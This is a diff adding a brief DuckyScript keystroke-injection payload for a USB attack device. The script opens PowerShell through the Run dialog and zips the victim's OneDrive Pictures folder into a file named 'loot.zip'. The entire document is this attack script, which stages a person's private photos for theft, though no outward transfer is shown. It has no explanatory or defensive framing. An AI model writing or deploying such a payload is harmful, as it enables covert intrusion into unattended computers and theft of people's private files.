@@ -1,0 +1,10 @@
+REM this opens powershell 
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell 
+ENTER 
+DELAY 500
+
+STRING Compress-Archive -Path "$env:USERPROFILE\OneDrive\Pictures\*" -DestinationPath "$env:USERPROFILE\OneDrive\Documents\loot.zip"
+ENTER
